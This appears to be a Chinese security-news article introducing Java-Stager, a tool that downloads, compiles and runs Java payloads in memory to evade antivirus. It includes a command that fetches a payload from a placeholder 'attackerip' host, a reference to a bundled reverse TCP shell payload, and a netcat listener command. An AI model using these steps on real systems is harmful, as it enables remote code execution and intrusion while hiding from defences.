**今天给大家介绍的是一款名叫Java-Stager的工具，在该工具的帮助下，我们可以轻松地在内存中下载、编译和执行Java文件（代码）。**

![看我如何利用这个Java
Stager在内存中下载、编译和执行Java文件](https://image.3001.net/images/20180913/1536821974_5b9a0ad64ff37.png!small)

注意：需要提醒大家一下，该项目仅供研究及测试使用，请不要将其用于恶意目的。

## Java-Stager介绍

本项目基于James Williams的演讲《下一代反病毒引擎vs我的垃圾代码》所开发，感兴趣的同学可以观看他的演讲视频以获取更多的灵感：

 **视频地址：**

看不到？点[这里](https://v.qq.com/x/page/k070234mcao.html)

### 演讲内容的关键点：

> 1\. 如何在目标设备中加载一个Stager（需要使用合法代码触及目标磁盘）；
>
> 2\. Stager通过HTTP下载源码（驻留在内存中）；
>
> 3\. Stager编译源码（同样在内存中进行）；
>
> 4\. Stager执行编译代码（同样在内存中进行）；

不过他的研究主要基于的是.net，不过我认为这种技术同样能够应用到Java中，所以我就设计了这样一个PoC来验证上述技术的可行性。

## 如何使用？

> 1\. 克隆整个项目代码；
>
> 2\. 在能够使用maven的IDE编辑器（例如NetBeans）中打开项目目录；
>
> 3\. Stager和样本Payload可以在项目目录的"/src/main/java”中找到；
>
> 4\. 选择你喜欢的Stager，然后编译项目代码，我在默认配置中选择的是“clean/build”；

Netbeans中的输出结果应该跟下面的代码类似：

    
    
    Buildingjar:C:\Users\cornerpirate\Documents\NetBeansProjects\java-stager\target\JavaStager-0.1-initial.jar

在目标主机中，你需要上传“JavaStageer*.jar”文件以及包含了Janino（从项目的“target”目录中获取）的“lib”文件夹。下面的命令将会执行stager：

    
    
    java-jar JavaStager-0.1-initial.jar

下面这条命令可以给你提供相关文件的使用信息：

    
    
    ProperUsage is: java -jar JavaStager-0.1-initial.jar <url>

其中的“url”是命令唯一需要的参数，该参数将会传递给Stager，下面给出的是一个使用样例：

    
    
    java-jar JavaStager-0.1-initial.jar http://attackerip/Payload.java

你的Payload必须存储在一个名叫“Payload.java”的文件中，你的漏洞利用代码必须写在名叫“Run”的静态方法内。如果你想自己开发的话，可以参考下面这个模版代码：

    
    
    publicclass Payload {
       public static void Run() {
          // Your code here
       }
    }

我在“TCPReverseShell.java”文件中还提供了一个可供参考的反向TCP
Payload，为了防止命名冲突，我就不将其取名为“Payload.java”了，如果你想了解“TCPReverseShell.java”的详细工作机制并进行定制开发的话，可以参考该文件Header中的注释内容。

除此之外，你可能还需要在自己的HTTP服务器上托管你的“Payload.java”文件，如果你只想使用简单的HTTP/HTTPS服务（Python2或Python3）的话，我建议你用Apache【[参考资料](https://cornerpirate.com/2016/12/16/simple-http-or-https-servers/)】。

除此之外。攻击端还需要启动一个netcat监听器并使用标准nc -lvp 8044技术来捕捉链接回调。

## 参考资料

Java-Stager工作机制介绍：【[传送门](https://cornerpirate.com/2018/08/06/java-stager-hide-from-av-in-memory/)】

工具实际操作演示：【[传送门](https://www.youtube.com/watch?v=-KkJVdSHPAc)】

 *** 参考来源：[java-stager](https://github.com/cornerpirate/java-stager)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM **

